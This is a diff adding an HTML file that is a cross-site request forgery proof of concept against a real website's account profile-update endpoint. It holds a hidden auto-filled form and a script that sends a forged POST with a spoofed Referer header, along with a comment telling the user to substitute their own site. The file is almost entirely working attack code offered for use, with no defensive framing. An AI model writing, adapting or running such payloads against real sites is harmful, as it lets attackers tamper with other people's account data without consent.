@@ -1,0 +1,36 @@
+<html>
+  <body>
+    <form action="https://www.cat.com/content/catdotcom/en_GB/account/myaccount/account-information/jcr:content/root/responsivegrid_1010483686/userprofile.updateUserProfile.html" method="POST" id="csrfForm">
+      <input type="hidden" name="givenname" value="Nyaaseys">
+      <input type="hidden" name="sn" value="Lwon123">
+      <input type="hidden" name="telephonenumber" value="+212625-638657">
+      <input type="hidden" name="c" value="MA">
+      <input type="hidden" name="st" value="10">
+      <input type="hidden" name="postalcode" value="75412">
+      <input type="hidden" name="o" value="wepay">
+      <input type="hidden" name="userProfile" value="true">
+      <input type="submit" value="Submit CSRF">
+    </form>
+    
+    <script>
+      // The URL for the POST request (target URL for the CSRF)
+      var formAction = "https://www.cat.com/content/catdotcom/en_GB/account/myaccount/account-information/jcr:content/root/responsivegrid_1010483686/userprofile.updateUserProfile.html";
+      
+      // Create an XMLHttpRequest to submit the form with the custom Referer header
+      var xhr = new XMLHttpRequest();
+      xhr.open("POST", formAction, true);
+
+      // Set custom Referer header without the protocol (no 'http://' or 'https://')
+      xhr.setRequestHeader("Referer", "nayssers.github.io");  // Replace with your website (without protocol)
+      
+      // Create FormData object from the form
+      var formData = new FormData(document.getElementById('csrfForm'));
+
+      // Send the request with the form data
+      xhr.send(formData);
+
+      // Optionally, automatically submit the form if necessary (this is redundant here since we're using xhr)
+      // document.getElementById('csrfForm').submit();
+    </script>
+  </body>
+</html>
